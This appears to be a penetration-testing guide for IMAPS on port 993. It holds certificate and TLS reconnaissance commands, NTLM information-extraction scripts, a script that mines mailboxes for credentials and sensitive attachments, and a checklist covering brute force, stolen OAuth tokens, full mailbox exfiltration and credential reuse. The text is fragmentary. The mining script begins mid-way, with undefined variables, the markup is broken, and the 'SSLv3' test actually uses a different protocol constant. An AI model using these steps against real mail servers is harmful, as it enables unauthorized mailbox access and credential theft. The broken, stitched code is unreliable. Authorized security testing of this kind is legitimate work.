## Overview

IMAPS (IMAP over SSL/TLS) is the encrypted variant of the Internet Message Access Protocol, running on **TCP port 993** with implicit TLS encryption. Unlike port 143 IMAP which optionally upgrades via STARTTLS, port 993 establishes the TLS tunnel **before** any IMAP commands are exchanged. IMAPS is a critical penetration testing target because it protects access to **complete mailbox contents** — emails containing credentials, password reset links, internal documents, API keys, VPN configurations, and sensitive business communications. The TLS layer itself introduces additional attack surface through certificate analysis, downgrade attacks, and cipher weaknesses.

::card-group
  ::card
  ---

  icon: i-lucide-network

  `993/TCP` (IMAPS — implicit TLS). Related: `143/TCP` (IMAP plaintext/STARTTLS), `995/TCP` (POP3S), `465/TCP` (SMTPS), `636/TCP` (LDAPS)

  ::card
  ---
  title: Protocol
  icon: i-lucide-cable
  ---
  IMAP4rev1 protocol encapsulated in TLS/SSL tunnel. Text-based tagged command/response after TLS handshake completes. All data encrypted in transit.

### SSL/TLS Certificate Analysis

::warning
IMAPS certificate analysis is a **goldmine** for enumeration. Certificates reveal hostnames, domain names, organizational information, certificate authority chains, validity periods, and Subject Alternative Names (SANs) that expose internal infrastructure.
::

::tabs
  :::tabs-item{icon="i-lucide-shield" label="Certificate Extraction"}
  ```bash [Terminal]
  # Full certificate details
  openssl s_client -connect <target>:993 2>/dev/null | openssl x509 -noout -text

  # Subject and Issuer
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -subject -issuer

  # Subject Alternative Names (SANs) — reveals additional hostnames
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -ext subjectAltName

  # Certificate validity dates
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -dates

  # Serial number and fingerprint
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -serial -fingerprint -sha256

  # Public key details
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -pubkey | openssl pkey -pubin -text

  # Full certificate chain
  openssl s_client -connect <target>:993 -showcerts 2>/dev/null

  # Check if self-signed
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -subject -issuer | \
    awk -F= '{print $NF}' | uniq -c | awk '$1>1{print "SELF-SIGNED!"}'

  # Check certificate expiry
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -checkend 0 && echo "Valid" || echo "EXPIRED!"

  # Extract all hostnames from certificate
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -noout -subject -ext subjectAltName | \
    grep -oP '(?:DNS:|CN\s*=\s*)\K[^\s,]+' | sort -u

  # Download certificate for offline analysis
  openssl s_client -connect <target>:993 2>/dev/null | \
    openssl x509 -outform PEM > imaps-cert.pem

  # Nmap SSL certificate extraction
  nmap -p 993 --script ssl-cert <target>

  # Certificate transparency logs search
  # https://crt.sh/?q=target.com
  curl -s "https://crt.sh/?q=%.target.com&output=json" | \
    jq -r '.[].name_value' | sort -u
  ```

  ```python [imaps_tls_audit.py]
  #!/usr/bin/env python3
  import ssl
  import socket
  import json
  from datetime import datetime

  target = "<target>"
  port = 993

  print(f"[*] TLS Analysis: {target}:{port}")

  # Create SSL context
  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  # Connect and get certificate
  with socket.create_connection((target, port), timeout=10) as sock:
      with ctx.wrap_socket(sock, server_hostname=target) as ssock:
          cert = ssock.getpeercert(binary_form=False)
          cert_bin = ssock.getpeercert(binary_form=True)
          cipher = ssock.cipher()
          version = ssock.version()
          shared_ciphers = ssock.shared_ciphers()

          print(f"\n[*] TLS Version: {version}")
          print(f"[*] Cipher Suite: {cipher[0]}")
          print(f"[*] Key Size: {cipher[2]} bits")

          if cert:
              print(f"\n[*] Certificate Subject:")
              for item in cert.get('subject', []):
                  for key, val in item:
                      print(f"    {key}: {val}")

              print(f"\n[*] Certificate Issuer:")
              for item in cert.get('issuer', []):
                  for key, val in item:
                      print(f"    {key}: {val}")

              print(f"\n[*] Subject Alternative Names:")
              for san_type, san_value in cert.get('subjectAltName', []):
                  print(f"    {san_type}: {san_value}")

              not_before = cert.get('notBefore', '')
              not_after = cert.get('notAfter', '')
              print(f"\n[*] Valid From: {not_before}")
              print(f"[*] Valid Until: {not_after}")

              # Check if expired
              try:
                  expiry = datetime.strptime(not_after, '%b %d %H:%M:%S %Y %Z')
                  if expiry < datetime.now():
                      print("[!!!] CERTIFICATE IS EXPIRED!")
                  else:
                      days_left = (expiry - datetime.now()).days
                      print(f"[*] Days until expiry: {days_left}")
              except:
                  pass

              # Check if self-signed
              subj = dict(x[0] for x in cert.get('subject', []))
              iss = dict(x[0] for x in cert.get('issuer', []))
              if subj == iss:
                  print("[!!!] SELF-SIGNED CERTIFICATE!")

          # Check supported ciphers
          print(f"\n[*] Shared Cipher Suites: {len(shared_ciphers or [])}")
          weak_ciphers = []
          for c in (shared_ciphers or []):
              name = c[0]
              if any(w in name for w in ['RC4', 'DES', 'NULL', 'EXPORT', 'MD5']):
                  weak_ciphers.append(name)
          if weak_ciphers:
              print(f"[!!!] WEAK CIPHERS FOUND:")
              for wc in weak_ciphers:
                  print(f"    {wc}")

  # Test deprecated TLS versions
  print(f"\n[*] Testing deprecated TLS versions:")
  for proto_name, proto_const in [
      ('SSLv3', ssl.PROTOCOL_SSLv23),
      ('TLSv1.0', ssl.PROTOCOL_TLSv1 if hasattr(ssl, 'PROTOCOL_TLSv1') else None),
      ('TLSv1.1', ssl.PROTOCOL_TLSv1_1 if hasattr(ssl, 'PROTOCOL_TLSv1_1') else None),
  ]:
      if proto_const is None:
          continue
      try:
          test_ctx = ssl.SSLContext(proto_const)
          test_ctx.check_hostname = False
          test_ctx.verify_mode = ssl.CERT_NONE
          with socket.create_connection((target, port), timeout=5) as s:
              with test_ctx.wrap_socket(s) as ss:
                  print(f"    [!!!] {proto_name}: SUPPORTED (insecure!)")
      except:
          print(f"    [OK] {proto_name}: Not supported")
  ```

  ```bash [Terminal]
  # Extract domain info from NTLM auth on IMAPS (Exchange)
  # No credentials required — just initiate NTLM negotiation

  nmap -p 993 --script imap-ntlm-info <target>

  # Extracts:
  # - Target_Name (NetBIOS Domain)
  # - NetBIOS_Domain_Name
  # - NetBIOS_Computer_Name
  # - DNS_Domain_Name (FQDN)
  # - DNS_Computer_Name (Server FQDN)
  # - DNS_Tree_Name (Forest name)
  # - Product_Version (OS version)

  # Manual NTLM extraction via Python
  python3 -c "
  import imaplib, ssl, base64

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  imap = imaplib.IMAP4_SSL('<target>', 993, ssl_context=ctx)
  print(f'Banner: {imap.welcome.decode()}')

  # Initiate NTLM auth
  try:
      typ, data = imap.authenticate('NTLM', lambda x: b'')
  except Exception as e:
      resp = str(e)
      print(f'NTLM Response: {resp}')
      # The error response contains the NTLM Type 2 challenge
      # which encodes domain/hostname/OS info

  imap.logout()
  "

  # Full NTLM extraction with parsing
  python3 << 'PYEOF'
  import socket, ssl, base64, struct

  target = "<target>"
  port = 993

  ctx = ssl.create_default_context()
  ctx.check_hostname = False
  ctx.verify_mode = ssl.CERT_NONE

  sock = socket.create_connection((target, port), timeout=10)
  ssock = ctx.wrap_socket(sock, server_hostname=target)

  banner = ssock.recv(4096)
  print(f"[*] Banner: {banner.decode().strip()}")

  ssock.send(b"a1 AUTHENTICATE NTLM\r\n")
  resp = ssock.recv(1024)
  print(f"[*] Auth prompt: {resp.decode().strip()}")

  # NTLM Type 1 (Negotiate)
  type1 = base64.b64encode(
      b"NTLMSSP\x00"
      b"\x01\x00\x00\x00"
      b"\x97\x82\x08\xe2"
      b"\x00\x00\x00\x00\x00\x00\x00\x00"
      b"\x00\x00\x00\x00\x00\x00\x00\x00"
  )
  ssock.send(type1 + b"\r\n")
  challenge_resp = ssock.recv(4096).decode().strip()
  print(f"[*] NTLM Type 2 received")

  # Parse Type 2 for domain info
  try:
      challenge_b64 = challenge_resp.replace("+ ", "").strip()
      challenge = base64.b64decode(challenge_b64)

      # Extract target info from NTLM Type 2
      if challenge[0:7] == b"NTLMSSP":
          target_info_offset = struct.unpack("<I", challenge[40:44])[0]
          target_info_len = struct.unpack("<H", challenge[38:40])[0]
          target_info = challenge[target_info_offset:target_info_offset + target_info_len]

          pos = 0
          while pos < len(target_info):
              av_id = struct.unpack("<H", target_info[pos:pos+2])[0]
              av_len = struct.unpack("<H", target_info[pos+2:pos+4])[0]
              av_value = target_info[pos+4:pos+4+av_len]

              names = {1: "NetBIOS_Domain", 2: "NetBIOS_Computer",
                       3: "DNS_Domain", 4: "DNS_Computer", 5: "DNS_Tree"}
              if av_id in names:
                  print(f"    {names[av_id]}: {av_value.decode('utf-16-le')}")
              if av_id == 0:
                  break
              pos += 4 + av_len
  except Exception as e:
      print(f"[-] Parse error: {e}")

  ssock.send(b"*\r\n")
  ssock.send(b"a2 LOGOUT\r\n")
  ssock.close()
  PYEOF
  ```

  ```python [imaps_mine.py]
  scan_count = min(200, len(all_msg_ids))  # Scan last 200

  print(f"[*] Scanning {scan_count} most recent messages...")

  findings = {}
  for mid in all_msg_ids[-scan_count:]:
      try:
          typ, data = imap.fetch(mid, '(RFC822)')
          msg = email.message_from_bytes(data[0][1])
          subject = msg.get('Subject', 'N/A')
          from_addr = msg.get('From', 'N/A')

          # Extract text body
          body = ""
          for part in msg.walk():
              ct = part.get_content_type()
              if ct in ('text/plain', 'text/html'):
                  payload = part.get_payload(decode=True)
                  if payload:
                      body += payload.decode(errors='ignore')

          # Check patterns
          for pattern_name, regex in body_patterns.items():
              matches = re.findall(regex, body)
              if matches:
                  if pattern_name not in findings:
                      findings[pattern_name] = []
                  for m in matches[:3]:
                      findings[pattern_name].append({
                          'match': m[:150],
                          'subject': str(subject)[:80],
                          'from': str(from_addr)[:60]
                      })

          # Check attachments for interesting filenames
          for part in msg.walk():
              fname = part.get_filename()
              if fname and any(ext in fname.lower() for ext in
                  ['.key', '.pem', '.pfx', '.p12', '.jks', '.kdb',
                   '.conf', '.config', '.env', '.ini', '.yml', '.yaml',
                   '.sql', '.bak', '.dump', '.csv', '.xls', '.xlsx',
                   '.ovpn', '.rdp', '.ppk', '.id_rsa']):
                  if 'sensitive_attachments' not in findings:
                      findings['sensitive_attachments'] = []
                  findings['sensitive_attachments'].append({
                      'filename': fname,
                      'subject': str(subject)[:80],
                      'from': str(from_addr)[:60]
                  })

      except Exception:
          pass

  # Print findings
  for category, items in findings.items():
      print(f"\n  [!] {category}: {len(items)} finding(s)")
      for item in items[:5]:
          print(f"      Subject: {item.get('subject', 'N/A')}")
          print(f"      From: {item.get('from', 'N/A')}")
          if 'match' in item:
              print(f"      Match: {item['match']}")
          if 'filename' in item:
              print(f"      File: {item['filename']}")
          print()

  imap.logout()
  ```

## Pentest Checklist

::steps{level="4"}

#### Port Discovery and Service Identification

Scan for port 993 and related mail ports. Capture TLS banner and identify the IMAP server software (Dovecot, Exchange, Cyrus, Zimbra) via banner, CAPABILITY, and ID commands.

#### SSL/TLS Certificate Analysis

Extract and analyze the server certificate for hostnames (CN and SANs), issuer, validity dates, self-signed status, and organizational information that reveals infrastructure details.

#### TLS Configuration Audit

Test for deprecated protocol versions (SSLv3, TLS 1.0, TLS 1.1), weak cipher suites (RC4, DES, NULL, EXPORT), and known vulnerabilities (Heartbleed, POODLE, CCS Injection, Logjam, FREAK).

#### Enumerate IMAP Capabilities and Auth Mechanisms

Send CAPABILITY command to identify supported authentication mechanisms (PLAIN, LOGIN, CRAM-MD5, NTLM, GSSAPI, XOAUTH2) and server extensions.

#### Extract NTLM Information (Exchange)

Use `imap-ntlm-info` to obtain domain name, hostname, FQDN, forest name, and OS version from Exchange servers without authentication.

#### Test Default and Common Credentials

Try default passwords for the identified mail server software. Test both `username` and `user@domain.com` formats.

#### Brute Force / Password Spray

Use Hydra, Metasploit, or custom scripts to brute force or password spray using discovered usernames against IMAPS port 993.

#### Enumerate Usernames via SMTP

If SMTP is available on the same host (port 25/587), use VRFY/RCPT TO enumeration to build a user list for IMAPS attacks.

#### Test OAuth2/XOAUTH2 Authentication

If XOAUTH2 is supported, test with stolen OAuth tokens. Check for app password support that bypasses MFA.

#### Access and Enumerate Mailboxes

After authentication, list all folders, check NAMESPACE for shared folders, enumerate mailbox sizes, quotas, and ACLs.

#### Search for Sensitive Email Content

Search SUBJECT and BODY for passwords, credentials, reset links, VPN configs, SSH keys, API tokens, private keys, and financial data.

#### Exfiltrate Complete Mailbox

Dump all emails and attachments using Python scripts, fetchmail, mbsync, or offlineimap for offline analysis.

#### Extract Credentials from Email Content

Parse dumped emails for plaintext passwords, password reset links, API keys, private keys, connection strings, internal hostnames/IPs, and OAuth tokens.

#### Test for Known Vulnerabilities

Test for CVEs specific to the identified server: Dovecot buffer overflow (CVE-2019-11500), Dovecot privilege escalation (CVE-2022-30550), Zimbra credential theft (CVE-2022-27924), Exchange ProxyLogon/ProxyShell.

#### Test Credential Reuse

Try discovered credentials against SMB, RDP, SSH, VPN, LDAP, web applications, and other mail protocols.

#### Document All Findings

Record evidence of weak TLS, self-signed/expired certificates, credential exposure, sensitive email content, and provide remediation recommendations.
